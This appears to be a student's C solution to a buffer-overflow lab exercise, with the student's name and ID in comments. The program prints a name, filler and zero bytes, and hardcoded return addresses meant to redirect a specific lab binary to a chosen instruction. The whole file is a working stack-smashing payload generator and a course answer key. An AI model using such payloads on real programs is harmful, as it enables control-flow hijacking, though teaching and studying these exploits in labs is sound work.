#include <stdio.h>
#include <string.h>
// Name: Rongrong Liu
// ID:   rl8nh
// This one is relatively easy, just redirect the program to the address of movb operation.
char attackString[] = "Rongrong Liu"; //12 characters 
int main() {
	int i;
	char *p = attackString;
	for (i = 0; i < sizeof(attackString); i++) {
		putchar(*p);
		p++;
	}

	unsigned char zero = 0x00;
	unsigned char nop = 0x90;
	unsigned char var = 0x66;

	for( i = 0; i < 51; i++){
			
		putchar(var);
	}
	
	for( i = 0; i < 12; i++){
			
		putchar(zero);
	}

 	
 	unsigned char 	retaddr[9] = {0xd5, 0x85, 0x04, 0x08, 0x80, 0xa0, 0x04, 0x08, 0x01};

	for( i = 0; i < 9; i++){
		putchar(retaddr[i]);
	}	


		return 1;
	}
